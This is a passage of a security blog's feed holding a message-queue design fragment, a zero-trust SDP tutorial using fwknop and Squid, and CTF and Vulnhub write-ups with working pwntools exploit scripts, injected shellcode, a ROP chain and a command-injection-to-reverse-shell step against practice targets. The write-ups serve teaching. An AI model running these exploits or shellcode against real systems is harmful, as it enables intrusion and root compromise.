different service servers according to the router table. This places a high demand on the performance of the master server.</p><p>Another option is to implement a message queue based on a publish-subscribe system. The basic structure is shown in the figure bellow.</p><p><img src="/img/ChatSystem/Picture12.png" alt="Cross-server communication via message queues"></p><p>Assume there is a client 1 login in at the ChatServer 1 and a client 2 login in at the ChatServer 2. ChatServer 1 and ChatServer 2 will subscribe to messages about “client 1” and “client 2”in the message queue respectively. If client 2 sends a message to client 1, the ChatServer 2 will publish the message with a flag “client 1” to the message queue. Then message queue will notify ChatServer 1 that someone sends a message to client 1. Chatserver 1 will access this message and send it to client 1.</p><p>Message queues also have disadvantages. First, once the message queue crashed, so doed the entire system. Second, message queue makes the system more complex. How to ensure that messages are not consumed repeatedly? How to deal with the case of message loss? How to ensure the sequential nature of message delivery? These are the challenges that need to be addressed. Finally, there is the issue of consistency. If a request requires multiple operations, but one of them fails. Although the feedback to the user is success, the request is actually not fully executed. In general, however, the advantages of message queues outweigh the disadvantages, so it is a better choice than the first option.</p>]]></content>
      
      
      <categories>
          
          <category> Program </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开源组件实现 Software Defined Perimeter</title>
      <link href="/2021/06/08/SoftwareDefinedPerimeter/"/>
      <url>/2021/06/08/SoftwareDefinedPerimeter/</url>
      
        <content type="html"><![CDATA[<p>零信任安全是当下一个比较火热的话题，很多厂家都在尝试将其落地，整合到企业安全框架之中，实现产品化。零信任安全其中一种比较可行的实现方案是通过SDP(Software Defined Perimeter)，本文尝试通过现有的开源组件实现SDP。</p><span id="more"></span><h2 id="参考模型"><a href="#参考模型" class="headerlink" title="参考模型"></a>参考模型</h2><p>本次尝试主要参考以下模型：</p><ul><li><p><a href="https://www.beyondcorp.com/">Google’s BeyondCorp</a></p></li><li><p><a href="https://cloudsecurityalliance.org/group/software-defined-perimeter/#_overview">Cloud Security Alliance model of Software Defined Perimeter</a></p></li></ul><h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h2><p><a href="http://www.cipherdyne.org/">fwknop</a> - Used to allow the SDP server to remain completely hidden from unauthorized use.  With this tool, the gateway server can be configured with 0 inbound port access.  The net result is that the gateway server is more hardened against port scanning, DDoS attacks, etc.  This component will be optional as the client component is not readily available on all major platforms (ie. iPhone).  This project is definitely worth a look for anyone looking to contribute to a really awesome open source project!</p><p><a href="http://www.squid-cache.org/">Squid</a> - Used to provide authorization to upstream resources.  Squid is being used because of it’s ability to use external authentication helpers and assign access based on group memberships from either a common database, or LDAP server.  Squid also gives us the granularity to apply rules based on destination host, URI, port or a combination.</p><h2 id="测试拓扑"><a href="#测试拓扑" class="headerlink" title="测试拓扑"></a>测试拓扑</h2><p><img src="/img/SDP/SDP1.png" alt="测试拓扑图"></p><h2 id="方案简述"><a href="#方案简述" class="headerlink" title="方案简述"></a>方案简述</h2><p>网络边界部署边界服务器，在边界服务器上安装Squid反向代理内网Web服务。同时在边界服务器上安装并开启fwknop-server，在客户端上安装fwknop-client，通过配置实现单包认证访问。</p><h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>网络拓扑比较简单，就不赘述搭建过程，进入正题。在内网Web服务器上搭建HTTP网站，关于如何在Winserver 2008 R2上搭建网站也很简单就直接跳过。现在我们搭建好的网站是这样的：</p><p><img src="/img/SDP/SDP2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>在边界服务器上安装Squid，由于本次边界服务器是Ubuntu系统，所以输入<code>sudo apt isntall squid</code>即可。然后通过<code>sudo vim /etc/squid/squid.conf</code>命令修改squid的配置文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#http_port 3128</span><br><span class="line">http_port 10.0.0.11:80 accel vhost vport</span><br><span class="line">cache_peer 192.168.88.10 parent 80 0 no-query no_digest originserver</span><br></pre></td></tr></table></figure><p>修改完成后通过<code>sudo systemctl restart squid</code>命令重启squid，这时候访问<code>http://10.0.0.11</code>就可以看到Step 1中搭建的网站。至此，HTTP反向代理就完成了。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>本次测试选用的客户端是Ubuntu，直接通过<code>sudo apt install fwknop-client</code>即可安装fwknop的客户端，本次测试安装的是2.6.9版本。如果是Windows端则要去<a href="http://www.cipherdyne.org/">fwknop官网</a>去下载源代码自行编译。</p><p>安装好fwknop-client之后执行<code>sudo fwknop -A tcp/80 -a 10.0.0.14 -D 10.0.0.11 --key-gen --use-hmac --save-rc-stanza</code>生成单包认证的Key。命令执行完之后会生成一个<code>.fwknoprc</code>文件，同时会告知文件位置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-A tcp/80           请求服务端打开的端口及其协议；</span><br><span class="line">-a 10.0.0.14        客户端的IP地址；</span><br><span class="line">-D 10.0.0.11        服务端的IP地址；</span><br><span class="line">-key-gen            生成一个加密密钥；</span><br><span class="line">--use-hmac          采用hmac加密认证方式；</span><br><span class="line">--save-rc-stanza    保存以上参数的执行结果。</span><br></pre></td></tr></table></figure><p>通过<code>sudo grep KEY /home/User/.fwknoprc</code>命令即可获取Key。</p><p><img src="/img/SDP/SDP3.png"></p><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>在边界服务器上通过<code>sudo apt install fwknop-server</code>安装fwknop服务端。然后输入<code>sudo vim /etc/fwknop/access.conf</code>修改服务端参数，将Step 3中客户端的Key加入配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SOURCE                 ANY</span><br><span class="line">REQUIRE_SOURCE_ADDRESS Y</span><br><span class="line">OPEN_PORTS             tcp/80</span><br><span class="line">KEY_BASE64             rvyA5SgenTMOagiBJJER4otC+6hdbOxXSZKW8ZN7Bsk=</span><br><span class="line">HMAC_KEY_BASE64        MtCbW46/8PCOLk7BImbLhtwSuXbPmCIyecZvmuY5Nx8NQ1PLrrqgEEumgq7YjhDXS6cpwHX/wbZ6ZckoX6dI4A==</span><br></pre></td></tr></table></figure><p>然后还需要修改<code>/etc/feknop/fwknopd.conf</code>文件，将监听的网卡修改为机器外网网卡：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Define the ethernet interface on which we will sniff packets.</span><br><span class="line"># Default if not set is eth0.  The &#x27;-i &lt;intf&gt;&#x27; command line option overrides</span><br><span class="line"># the PCAP_INTF setting.</span><br><span class="line">#</span><br><span class="line">PCAP_INTF                   ens33;</span><br></pre></td></tr></table></figure><p>最后通过iptables实现对80端口的隐藏：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo iptables -I INPUT 1 -i ens33  -p tcp --dport 80 -j DROP</span><br><span class="line">sudo iptables -I INPUT 1 -i ens33 -p tcp --dport 80 -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure><p>运行<code>sudo fwknopd reload</code>命令重启fwknopd服务，可通过<code>sudo fwknopd -S</code>命令查看服务状态，通过<code>sudo fwknopd --fw-list-all</code>命令查看iptables规则。</p><p>这样边界服务器的设置就完成了。</p><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><p>此时所有地址都无法访问边界服务器的HTTP服务，nmap扫描的结果如下：</p><p><img src="/img/SDP/SDP4.png"></p><p>而当我们在client上执行<code>sudo fwknop -n 10.0.0.11</code>命令发送单包认证后，会发现此时80端口已经对client开放（如果不做任何操作30s后会自动关闭，更多配置在服务端的fwknop配置文件中）：</p><p><img src="/img/SDP/SDP5.png"></p><p>这个时候client就可以访问到搭建在内网的HTTP服务了。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>结合下面的代理工具我们可以实现一些自动化以及非Web服务的单包认证机制。</p><p><a href="https://openvpn.net/index.php/open-source.html">OpenVPN</a> - Used to ensure a completely encrypted communication channel between personal devices (laptop, cell phone, etc) and the gateway server.  OpenVPN includes support on every major platform and is simple to adjust the configuration to the user’s needs.  In our model, we are not using OpenVPN in the traditional sense of a VPN as the gateway server will not be configured to forward traffic directly to an upstream device.  OpenVPN also supports additional authentication plugins allowing things like two-factor authentication to become possible. OpenVPN also provides the awesome PKI tool easy-rsa. easy-rsa gives us the ability to provision and manage certificates for all of our components.</p><p><a href="https://github.com/darkk/redsocks">Redsocks Proxy</a> - This tool will be used to forward non-web traffic through our Squid proxy.</p><p>以及更多的fwknop指导在<a href="http://www.cipherdyne.org/fwknop/docs/fwknop-tutorial.html">这里</a>。</p>]]></content>
      
      
      <categories>
          
          <category> Security Framework </category>
          
          <category> Zero Trust </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Zero Trust </tag>
            
            <tag> SDP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ - Calcexe の Write-Up</title>
      <link href="/2021/02/04/Calcexe/"/>
      <url>/2021/02/04/Calcexe/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>题目捎带迷惑性，文件后缀为<code>.exe</code>，看起来是windows下的运行程序，结果在windows上根本无法运行。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>checksec：</p><p><img src="/img/Calcexe/Calcexe1.png"></p><p>依然是32位的ELF文件。</p><p>将程序在IDA中打开，在main函数中发现定义了10个功能：</p><p><img src="/img/Calcexe/Calcexe2.png"></p><p>这是功能申明函数sub_804A719：</p><p><img src="/img/Calcexe/Calcexe3.png"></p><p>所以程序运行是这样的：</p><p><img src="/img/Calcexe/Calcexe4.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>由于程序很长，所以就挑选关键部分来说。 程序申明了10个函数，如果能够控制这些函数的指针那么就可以控制程序跳转执行shellcode。</p><p>而在主函数后发现处理function的函数：</p><p><img src="/img/Calcexe/Calcexe5.png"></p><p><code>strtok()</code>是分割字符串的函数，这里用来处理空格。0x61是<code>&#39;=&#39;</code>，0x34是<code>&#39;“&#39;</code>，所以根据伪代码发现程序允许通过<code>var</code>参数声明变量，命令格式为<code>var variable = “value”</code>。</p><p>这一段程序中还提到了下面的函数：</p><p><img src="/img/Calcexe/Calcexe6.png"></p><p>分析sub_804A820函数发现程序寻址是通过比较变量名实现的，所以即使<code>var add = “eval”</code>也是程序允许的，这样我们就可以控制函数指针了。因此直接把某个函数的method改成shellcode即可。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line"></span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9892)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = &#x27;var add = &quot;&#x27;+ shellcode + &#x27;&quot;&#x27;</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;&gt;&quot;, payload)</span><br><span class="line">sh.sendline(&#x27;+&#x27;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果：</p><p><img src="/img/Calcexe/Calcexe7.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ - Add の Write-Up</title>
      <link href="/2021/01/28/Add/"/>
      <url>/2021/01/28/Add/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Add是MIPS架构的一道入门级别的栈溢出题，MIPS架构是一种采取精简指令集（RISC）的处理器架构。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>checksec发现是MIPS架构的32位程序：</p><p><img src="/img/Add/Add1.png"></p><p>连接到服务器端看下程序运行逻辑：</p><p><img src="/img/Add/Add2.png"></p><p>看起来是个简单的加法计算器。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>Ghidra反编译看下main函数的代码：</p><p><img src="/img/Add/Add3.png"></p><p><img src="/img/Add/Add4.png"></p><p>结合retdec反编译的C代码：</p><p><img src="/img/Add/Add5.png"></p><p>在LAB_00400b18中有这样一个片段：</p><p><img src="/img/Add/Add6.png"></p><p>根据main函数的代码发现buf放的是输入内容，而程序接受输入的时候是遇到\n才停止，所以存在输入过长导致栈溢出的问题。</p><p>上图中片段可以实现打印buf的地址，想要执行这个功能需要满足buf和challenge相等，buf是由我们控制的。</p><p>&amp;emsp;&amp;emspchallenge表面上是rand()生成的随机数，但是由于随机种子是由srand(0x123456)生成的，即为固定值，导致challenge也是固定值。</p><p>通过上面的分析我们可以得到栈上buf的地址，加上程序没有NX保护。所以当在buf中布置好shellcode控制程序跳转执行即可。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>利用cyclic生成200个字节，通过调试发现溢出偏移量为112即0x70。这里要注意只有退出程序才会回到返回地址，所以最后需要一个退出的操作。</p><p>另外在调试中发现如果直接部署在buf上，在shellcode中指令会将&#x2F;bin&#x2F;sh字符串修改导致get shell 失败。所以需要将shellcode再偏移4或8和字节。</p><p>利用msfvenom生成payload：</p><p><img src="/img/Add/Add7.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>下面是PWN脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import CDLL</span><br><span class="line"></span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9889)</span><br><span class="line"></span><br><span class="line">dll = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">dll.srand(0x123456)</span><br><span class="line">key = dll.rand()</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;help.\n&quot;, str(key))</span><br><span class="line">sh.recvuntil(&quot;Your input was&quot;)</span><br><span class="line">stack_addr = int(sh.recvline().strip(), 16)</span><br><span class="line"></span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0&quot;</span><br><span class="line">buf += b&quot;\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff&quot;</span><br><span class="line">buf += b&quot;\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02&quot;</span><br><span class="line">buf += b&quot;\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br><span class="line"></span><br><span class="line">payload = &#x27;0&#x27;*4 + buf.ljust(0x70 - 4, &#x27;0&#x27;) + p32(stack_addr + 4)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.sendline(&#x27;exit&#x27;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>脚本运行结果：</p><p><img src="/img/Add/Add8.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> MIPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jarvis OJ - Typo の Write-Up</title>
      <link href="/2021/01/20/Typo/"/>
      <url>/2021/01/20/Typo/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Typo作为ARM架构的题目，算是简单的入门题，让初学者能够了解ARM架构的函数调用过程。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>程序看起来是一个很有趣的打字游戏：</p><p><img src="/img/Typo/Typo1.png"></p><p>checksec发现是arm架构的32位程序：</p><p><img src="/img/Typo/Typo2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>再简单的温习一下ARM架构的函数调用：</p><p><img src="/img/Typo/Typo3.png"></p><ul><li><p>R0～R3通常用于传参，剩下的参数从右向左依次入栈，被调用者实现栈平衡，返回值存放在R0中；</p></li><li><p>r15  -&gt;  pc  &#x3D;&gt; 当前程序执行位置；</p></li><li><p>r14  -&gt;  lr  &#x3D;&gt; 连接寄存器：跳转指令自动把返回地址放入r14中；</p></li><li><p>r13  -&gt;  sp  &#x3D;&gt; 栈指针：指向上一帧的栈底；</p></li><li><p>r12  -&gt;  ip  &#x3D;&gt; ip 内部过程调用寄存器Intra-Procedure-call scratch register，其实就是r12；</p></li><li><p>r11  -&gt;  fp  &#x3D;&gt; 当前函数栈帧的栈底,也就是栈基地址FP；</p></li></ul><p>ARM架构的栈布局如下图所示：</p><p><img src="/img/Typo/Typo4.png"></p><p>main stack frame为调用函数的栈帧，func1 stack frame为当前函数(被调用者)的栈帧，栈底在高地址，栈向下增长。图中FP就是栈基址，它指向函数的栈帧起始地址；</p><p>SP则是函数的栈指针，它指向栈顶的位置。ARM压栈的顺序很是规矩，依次为当前函数指针PC、返回指针LR、栈指针SP、栈基址FP、传入参数个数及指针、本地变量和临时变量。先压栈的main stack 进入在高地址。</p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>回到Typo程序本身，在程序中有‘&#x2F;bin&#x2F;sh’字符串：</p><p><img src="/img/Typo/Typo5.png"></p><p>同时看到是sub_10ba8函数调用这个字符串，根据sub_10ba8函数发现这个函数其实就是system函数。在这个函数下面紧接着就是sub_110b4函数可以调用sub_10ba8即system函数。</p><p><img src="/img/Typo/Typo6.png"></p><p>有了system函数和’&#x2F;bin&#x2F;sh’，接下来需要的是找一个gadget控制R0寄存器：</p><p><img src="/img/Typo/Typo7.png"></p><p>根据找到的gadget构造这样的栈结构：</p><p><img src="/img/Typo/Typo8.png"></p><p>这样在程序返回时, 经过ROP Chain就会实现<code>r0 -&gt; “/bin/sh”</code>, <code>r4 -&gt; junk_data</code>, <code>pc = system_addr</code>的效果, 进而执行<code>system(&quot;/bin/sh&quot;)</code>来get shell。</p><p>最后就是寻找溢出点，确定padding的长度。</p><p><img src="/img/Typo/Typo9.png"></p><p>利用cyclic可以计算出padding长度112。</p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>所以解题脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># sh = process(&#x27;./typo&#x27;)</span><br><span class="line">sh = remote(&quot;pwn2.jarvisoj.com&quot;, 9888)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*112 + p32(0x20904) + p32(0x6c384) + p32(1) + p32(0x110b4)</span><br><span class="line"></span><br><span class="line">sh.sendafter(&#x27;quit&#x27;, &#x27;\n&#x27;)</span><br><span class="line">sh.recvline()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/img/Typo/Typo10.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ARM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Brainpan 2 の Write-Up</title>
      <link href="/2020/12/02/Brainpan2/"/>
      <url>/2020/12/02/Brainpan2/</url>
      
        <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><code>Vulnhub</code>靶机<code>Brainpan</code>系列的第二台，有点小难度，还有点烧脑。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>首先确定靶机IP：</p><p><img src="/img/Brainpan2/Brainpan1.png"></p><p>扫描开放端口：</p><p><img src="/img/Brainpan2/Brainpan2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>和brainpan一样，9999端口开放了一个相似的程序，10000端口是个静态页面。</p><p>扫描目录，还是有bin目录：</p><p><img src="/img/Brainpan2/Brainpan3.png"></p><p>依然有个<code>brainpan.exe</code>文件，通过<code>file</code>命令发现是<code>jpeg</code>格式的图片：</p><p><img src="/img/Brainpan2/Brainpan4.png"></p><p>改后缀名打开后发现是超级玛丽……</p><p><img src="/img/Brainpan2/Brainpan5.png"></p><p>可是通过隐写或者夹层等多种方式也无法在其中找到任何有用的信息，只能回头去看9999端口的服务。</p><p>通过多次尝试，原来登录口令就是<code>GUEST</code>：</p><p><img src="/img/Brainpan2/Brainpan6.png"></p><p><code>HELP</code>命令查看各个命令内容：</p><p><img src="/img/Brainpan2/Brainpan7.png"></p><p>通过<code>FILES</code>指令列出文件：</p><p><img src="/img/Brainpan2/Brainpan8.png"></p><p>通过<code>VIEW</code>指令在<code>notes.txt</code>中发现是通过<code>popen(“command”, “r”)</code>实现的各种功能，猜测<code>VIEW</code>指令的实现方式是<code>popen(“cat &lt;filename&gt;”, “r”)</code>。</p><p><img src="/img/Brainpan2/Brainpan9.png"></p><p>尝试通过<code>&quot;;&quot;</code>绕过实现任意命令执行：</p><p><img src="/img/Brainpan2/Brainpan10.png"></p><p>执行python反弹shell的命令，获得靶机的shell：</p><p><img src="/img/Brainpan2/Brainpan11.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>尝试SUID提权：</p><p><img src="/img/Brainpan2/Brainpan12.png"></p><p>最后一个命令看起来比较有趣：</p><p><img src="/img/Brainpan2/Brainpan13.png"></p><p>进入对应文件夹下寻找信息：</p><p><img src="/img/Brainpan2/Brainpan14.png"></p><p>尝试将<code>msg_root</code>下载到本地查看：</p><p><img src="/img/Brainpan2/Brainpan15.png"></p><p>搭建python建议http服务器，访问<code>http://172.16.83.5:7788/msg_root</code>即可下载对应文件。</p><p>将<code>msg_root</code>通过IDA逆向：</p><p><img src="/img/Brainpan2/Brainpan16.png"></p><p><code>get_name</code>函数：</p><p><img src="/img/Brainpan2/Brainpan17.png"></p><p>根据<code>get_name</code>函数，对于<code>username</code>变量，当我们输入的字节数超过<code>0x11字节</code>后，并没有<code>“\x00”</code>这样的结束符，所以输入过长的时候可能造成缓冲区溢出。</p><p>当<code>fp(username, message)</code>;调用<code>save_msg</code>函数的时候便可以通过控制<code>username</code>长度实现覆盖<code>EIP</code>地址，从而跳转到覆盖的位置执行shellcode。</p><p><img src="/img/Brainpan2/Brainpan18.png"></p><p>根据<code>get_name</code>函数的汇编程序，在<code>0x08048729</code>地址可以控制<code>eax</code>寄存器，从而通过下一步的<code>call eax</code>指令实现任意地址跳转。</p><p>所以在<code>0x8048729</code>的位置下个断点：</p><p><img src="/img/Brainpan2/Brainpan19.png"></p><p>可以看到程序正常运行的时候，<code>ebp-4</code>的地址放着<code>save_msg</code>函数的地址，message部分的内容会被放到<code>0x804a008</code>的地址上去：</p><p><img src="/img/Brainpan2/Brainpan20.png"></p><p>所以我们通过<code>username</code>字段反复重复<code>0x804a008</code>这个地址以覆盖<code>eax</code>，然后将shellcode放到message段即可。</p><p>下面还是通过<code>msfvenom</code>模块生成shellcode：</p><p><img src="/img/Brainpan2/Brainpan21.png"></p><p>最后的<code>payload</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msg_root `perl -e <span class="string">&#x27;print &quot;\x04\x08\x08\xa0&quot;x8;&#x27;</span>` `perl -e <span class="string">&#x27;print &quot;\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1&quot;;&#x27;</span>`</span><br></pre></td></tr></table></figure><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>执行了payload之后可以看到获得了root权限:</p><p><img src="/img/Brainpan2/Brainpan22.png"></p><p>进入<code>/root</code>文件夹发现两个文件，打开<code>flag.txt</code>提示没有权限，打开<code>whatif.txt</code>提示我们还不是root权限？WTF？</p><p><img src="/img/Brainpan2/Brainpan23.png"></p><p>那就继续尝试SUID提权：</p><p><img src="/img/Brainpan2/Brainpan24.png"></p><p>多了一个<code>brainpan-1.8.exe</code>文件，查看文件夹寻找信息：</p><p><img src="/img/Brainpan2/Brainpan25.png"></p><p>先看一下<code>brainpan.7</code>文件是什么内容：</p><p><img src="/img/Brainpan2/Brainpan26.png"></p><p>文件最后给了提示，我们需要更改<code>brainpan.cfg</code>文件内容修改地址和端口：</p><p><img src="/img/Brainpan2/Brainpan27.png"></p><p>然后运行<code>brainpan-1.8.exe</code>，再连接上去通过命令执行反弹shell：</p><p><img src="/img/Brainpan2/Brainpan28.png"></p><p>接收到<code>puck</code>用户的shell：</p><p><img src="/img/Brainpan2/Brainpan29.png"></p><p>进入<code>/home/puck</code>文件夹寻找线索，有个<code>.backup</code>：</p><p><img src="/img/Brainpan2/Brainpan30.png"></p><p>进去看一下发现可能是前一个文件夹的备份：</p><p><img src="/img/Brainpan2/Brainpan31.png"></p><p>看下唯一有区别的<code>.bash_history</code>文件：</p><p><img src="/img/Brainpan2/Brainpan32.png"></p><p>果然，这里看出来了些端倪。原来是<code>root</code>和<code>root(space)</code>两个账号……</p><p>厉害的让人无F*UCK说……</p><p>通过备份里的<code>.ssh</code>可以ssh连接<code>root(space)</code>：</p><p><img src="/img/Brainpan2/Brainpan33.png"></p><p>但是却提示连接失败，猜测是换了ssh端口，看下配置文件：</p><p><img src="/img/Brainpan2/Brainpan34.png"></p><p>果然端口被改到了2222，再次尝试：</p><p><img src="/img/Brainpan2/Brainpan35.png"></p><p>果然是<code>root(space)</code>账号，再次去查看<code>flag.txt</code>：</p><p><img src="/img/Brainpan2/Brainpan36.png"></p><p>城里人真会玩系列：</p><p><img src="/img/Brainpan2/Brainpan37.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Brainpan の Write-Up</title>
      <link href="/2020/11/20/Brainpan/"/>
      <url>/2020/11/20/Brainpan/</url>
      
